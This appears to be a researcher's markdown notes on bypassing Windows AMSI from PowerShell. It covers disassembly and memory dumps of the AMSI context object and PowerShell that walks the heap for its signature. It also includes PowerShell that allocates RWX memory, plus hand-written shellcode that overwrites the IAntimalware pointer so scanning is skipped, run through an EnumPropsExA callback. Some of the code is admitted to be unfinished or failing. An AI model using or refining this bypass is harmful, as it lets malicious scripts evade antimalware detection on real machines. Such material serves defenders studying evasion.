### AMSI Microsoft Documentation
https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps


### MSDN Functions
#### AmsiScanBuffer
https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer

```bash
HRESULT AmsiScanBuffer(
  HAMSICONTEXT amsiContext,
  PVOID        buffer,
  ULONG        length,
  LPCWSTR      contentName,
  HAMSISESSION amsiSession,
  AMSI_RESULT  *result
);
```

### AMSI Context Object
https://codewhitesec.blogspot.com/2019/07/heap-based-amsi-bypass-in-vba.html

Part of AmsiScanBuffer
```text
70E35527 | 8B31                     | mov esi,dword ptr ds:[ecx]              | <---- ecx = 0x031196d8
70E35529 | 50                       | push eax                                | eax:&" NãpÐNãp Nãp"
70E3552A | 51                       | push ecx                                |
70E3552B | 8B4E 0C                  | mov ecx,dword ptr ds:[esi+C]            |
70E3552E | FF15 C4D1E370            | call dword ptr ds:[70E3D1C4]            |
70E35534 | FF56 0C                  | call dword ptr ds:[esi+C]               |
70E35537 | EB 05                    | jmp amsi.70E3553E                       |
70E35539 | B8 57000780              | mov eax,80070057                        | eax:&" NãpÐNãp Nãp"
70E3553E | 5E                       | pop esi                                 |
70E3553F | 5B                       | pop ebx                                 |
70E35540 | C9                       | leave                                   |
70E35541 | C2 1800                  | ret 18                                  |
```

AMSI Context Object
```c
typedef struct tagHAMSICONTEXT {
  DWORD        Signature;          // "AMSI" or 0x49534D41
  PWCHAR       AppName;            // set by AmsiInitialize
  IAntimalware *Antimalware;       // set by AmsiInitialize
  DWORD        SessionCount;       // increased by AmsiOpenSession
} _HAMSICONTEXT, *_PHAMSICONTEXT;
```

```text
02FC21C0  41 4D 53 49 A0 41 03 03 D8 96 11 03 EC 14 00 00  AMSI A..Ø...ì...  
02FC21D0  E0 FD E1 89 A0 12 00 88 C8 B7 C3 73 70 20 FC 02  àýá. ...È·Ãsp ü.  
```

PWChar AppName
```text
030341A0  50 00 6F 00 77 00 65 00 72 00 53 00 68 00 65 00  P.o.w.e.r.S.h.e.  
030341B0  6C 00 6C 00 5F 00 43 00 3A 00 5C 00 57 00 69 00  l.l._.C.:.\.W.i.  
030341C0  6E 00 64 00 6F 00 77 00 73 00 5C 00 53 00 79 00  n.d.o.w.s.\.S.y.  
030341D0  73 00 57 00 4F 00 57 00 36 00 34 00 5C 00 57 00  s.W.O.W.6.4.\.W.  
030341E0  69 00 6E 00 64 00 6F 00 77 00 73 00 50 00 6F 00  i.n.d.o.w.s.P.o.  
030341F0  77 00 65 00 72 00 53 00 68 00 65 00 6C 00 6C 00  w.e.r.S.h.e.l.l.  
03034200  5C 00 76 00 31 00 2E 00 30 00 5C 00 70 00 6F 00  \.v.1...0.\.p.o.  
03034210  77 00 65 00 72 00 73 00 68 00 65 00 6C 00 6C 00  w.e.r.s.h.e.l.l.  
03034220  2E 00 65 00 78 00 65 00 5F 00 31 00 30 00 2E 00  ..e.x.e._.1.0...  
03034230  30 00 2E 00 31 00 39 00 30 00 34 00 31 00 2E 00  0...1.9.0.4.1...  
03034240  31 00 00 00 00 00 00 00 70 E1 01 03 10 01 00 00  1.......pá......  
```

IAntimalware Antimalware
```text
031196D8  A4 15 E3 70 01 00 00 00 FF FF FF FF FF FF FF FF  ¤.ãp....ÿÿÿÿÿÿÿÿ  
031196E8  00 00 00 00 00 00 00 00 00 00 00 00 D0 07 00 02  ............Ð...  
031196F8  01 00 00 00 A0 65 03 03 00 00 00 00 00 00 00 00  .... e..........  
03119708  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................  
03119718  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................  
03119728  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................  
```

\*Antimalware ... points to an array of CFG verified function pointers
```text
70E31544  40 87 E3 70 10 87 E3 70 30 6F E3 70 E0 71 E3 70  @.ãp..ãp0oãpàqãp  
70E31554  80 8E E3 70 84 1A E3 70 70 86 E3 70 C0 86 E3 70  ..ãp..ãpp.ãpÀ.ãp  
70E31564  90 86 E3 70 E0 5A E3 70 30 5B E3 70 80 1B E3 70  ..ãpàZãp0[ãp..ãp  
70E31574  70 87 E3 70 C0 86 E3 70 D0 87 E3 70 10 8C E3 70  p.ãpÀ.ãpÐ.ãp..ãp  
70E31584  E0 1C E3 70 B0 61 E3 70 A0 AD E3 70 A0 AD E3 70  à.ãp°aãp .ãp .ãp  
70E31594  00 62 E3 70 60 62 E3 70 20 62 E3 70 B0 1B E3 70  .bãp`bãp bãp°.ãp  
70E315A4  D0 88 E3 70 C0 86 E3 70 F0 88 E3 70 30 6F E3 70  Ð.ãpÀ.ãpð.ãp0oãp <--here  
70E315B4  E0 71 E3 70 40 8C E3 70 F8 1A E3 70 B0 61 E3 70  àqãp@.ãpø.ãp°aãp  
70E315C4  80 62 E3 70 90 62 E3 70 00 62 E3 70 60 62 E3 70  .bãp.bãp.bãp`bãp  
70E315D4  20 62 E3 70 E0 1B E3 70 B0 61 E3 70 C0 62 E3 70   bãpà.ãp°aãpÀbãp  
70E315E4  D0 62 E3 70 00 62 E3 70 60 62 E3 70 20 62 E3 70  Ðbãp.bãp`bãp bãp  
70E315F4  C4 1A E3 70 B0 61 E3 70 00 63 E3 70 10 63 E3 70  Ä.ãp°aãp.cãp.cãp  
70E31604  40 63 E3 70 60 62 E3 70 20 62 E3 70 4C 1A E3 70  @cãp`bãp bãpL.ãp  
70E31614  A0 AD E3 70 A0 AD E3 70 A0 AD E3 70 E0 5A E3 70   .ãp .ãp .ãpàZãp  
70E31624  30 5B E3 70 00 00 00 00 00 00 00 00 A8 2C E3 70  0[ãp........¨,ãp  
70E31634  00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00  ................  
70E31644  00 00 00 00 00 00 00 00 00 00 00 00 B8 2C E3 70  ............¸,ãp  

```


#### What it is for
Maintaining state between scans. Keeps track of number of runs with SessionCount. 

#### How it is created

```c
    CoInitializeEx(0, COINIT_MULTITHREADED);
    AmsiInitialize(AMSIPROJECTNAME, &context);
    AmsiOpenSession(context, &session);
```

#### How to find it

Since the amsi context object is allocated on the native heap (because of COM), we can walk the peb to get the heaps and pass them to heapwalk to search for heap chunks matching amsi context object structre. 

The following PowerShell code attempts this but is still unfinished:
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
 
public class HeapApi {
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_HEAP_ENTRY {
        public IntPtr lpData;
        public uint cbData;
        public byte cbOverhead;
        public byte iRegionIndex;
        public ushort wFlags;
        public UnionBlockRegion BlockRegion;
 
        [StructLayout(LayoutKind.Explicit)]
        public struct UnionBlockRegion {
            [FieldOffset(0)]
            public BlockStruct Block;
            [FieldOffset(0)]
            public RegionStruct Region;
 
            public struct BlockStruct {
                public IntPtr hMem;
                public uint dwReserved1;
                public uint dwReserved2;
                public uint dwReserved3;
            }
 
            public struct RegionStruct {
                public uint dwCommittedSize;
                public uint dwUnCommittedSize;
                public IntPtr lpFirstBlock;
                public IntPtr lpLastBlock;
            }
        }
 
        public const ushort PROCESS_HEAP_ENTRY_BUSY = 0x0004;
    }
 
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcessHeap();
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool HeapWalk(
        IntPtr hHeap,
        ref PROCESS_HEAP_ENTRY lpEntry
    );
}
"@
 
# Get the default heap handle
$heapHandle = [HeapApi]::GetProcessHeap()
Write-Host "Default process heap handle: $heapHandle"
 
# Prepare the heap entry struct
$entry = New-Object HeapApi+PROCESS_HEAP_ENTRY

$target = 0x49534d41
$tgt = 0x414d5349

# Walk the heap
while ([HeapApi]::HeapWalk($heapHandle, [ref]$entry)) {
    $flags = $entry.wFlags
    $size = $entry.cbData
    $addr = $entry.lpData
 
    if ($flags -band [HeapApi+PROCESS_HEAP_ENTRY]::PROCESS_HEAP_ENTRY_BUSY) {
	try {
    # this read always seems to fail... we may need to do this in shellcode
		$value = [System.Runtime.InteropServices.Marshal]::ReadInt32($addr)
		
		if ($value -eq $target -bor $value -eq $tgt){
			Write-Host("[MATCH] addr: {0} size: {1} sig: {3}" -f $addr, $size, $sig)
		}
	} catch {
		Write-Host "failed to read from $addr"
	}
}

}
 
if (-not $?) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Host "HeapWalk ended. Last error: $err"
}
# again trying to read from memory seems to keep failing
$rawadd = 0x03585458
$add = New-Object System.IntPtr([UInt32]$rawadd)
$b0 = [System.Runtime.InteropServices.Marshall]::ReadByte([System.IntPtr]::new($add.ToInt32(), 0))
write-host($b0)
```

#### Useful Modifications 

We need to place a replace IAntiMalware in the amsi structure. Need to bypass cfg (rwx heap addr) and use a good spot (so the call just ret's with good code)

Below is the unknown function we will be modifiying so that AMSI IAntiMalware is not called
```
73338E50 | 8BFF                     | mov edi,edi                             |
73338E52 | 55                       | push ebp                                |
73338E53 | 8BEC                     | mov ebp,esp                             |
73338E55 | FF75 10                  | push dword ptr ss:[ebp+10]              |
73338E58 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |
73338E5B | BA 60163373              | mov edx,amsi.73331660                   | 73331660:"$.3s"
73338E60 | FF75 0C                  | push dword ptr ss:[ebp+C]               |
73338E63 | E8 55D0FFFF              | call amsi.73335EBD                      |
73338E68 | 5D                       | pop ebp                                 |
73338E69 | C2 0C00                  | ret C                                   |
```

This is the code we need to execute at the desired location
```
xor eax, eax
ret 0x0C
```

### ShellCode
To get memory for our shellcode we can use VirtualAlloc to allocate RWX memory.
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Memory {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flAllocationType,
        uint flProtect);
}
"@

# Constants
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

# Allocation size (e.g., 4096 bytes)
$size = [UIntPtr]::new(0x1000)

# Allocate RWX memory
$addr = [Memory]::VirtualAlloc([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

if ($addr -ne [IntPtr]::Zero) {
    Write-Host "RWX memory allocated at address:" $addr
} else {
    Write-Host "Failed to allocate memory."
}
```


The following shellcode will take the provided pointer to AMSI and modify the IAntiMalware pointer so that scanning will not occurr. 

```text
071A0000 | EB 0F                    | jmp 71A0011                             | User-allocated memory
071A0002 | 90                       | nop                                     |
071A0003 | 90                       | nop                                     |
071A0004 | 90                       | nop                                     |
071A0005 | 59                       | pop ecx                                 | get address of our overwrite function
071A0006 | 8B58 08                  | mov ebx,dword ptr ds:[eax+8]            | get the IAntiMalware function pointer
071A0009 | 890B                     | mov dword ptr ds:[ebx],ecx              | overwrite the IAntiMalware function pointer
071A000B | C3                       | ret                                     | return
071A000C | 90                       | nop                                     |
071A000D | 90                       | nop                                     |
071A000E | 90                       | nop                                     |
071A000F | 90                       | nop                                     |
071A0010 | 90                       | nop                                     |
071A0011 | E8 EFFFFFFF              | call 71A0005                            | jump back so we know where the overwrite is
071A0016 | 31C0                     | xor eax,eax                             |
071A0018 | C2 0C00                  | ret C                                   |
071A001B | 90                       | nop                                     |
```

This shellcode can be executed by the code listed below. More details are at [["30 - Win32 CallBack Functions.md"]].

```powershell
function Update-EnumPropsExA{
	$sig = @"

[DllImport("user32.dll", EntryPoint="EnumPropsExA")]
public static extern int EnumPropsExA( uint hwind, uint lpfunc, string lParam);

const int HWIND =  0x20592;
const int LPFUNC = 0x5F15E3B8;
const string LPARAM = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

public static void UpdateEnumPropsExA(){
	uint i;
	int outval;
	uint tmp = 0x00ffffffff;
	for (i = 0x00000011; i < tmp; i++){
		outval = EnumPropsExA(i, LPFUNC, LPARAM);
		if (outval == 1337){
			break;
			}
		}
}
"@
	Add-Type -MemberDefinition $sig -Name EnumPropsExASPI -Namespace User32
	[User32.EnumPropsExASPI]::UpdateEnumPropsExA()
}

```
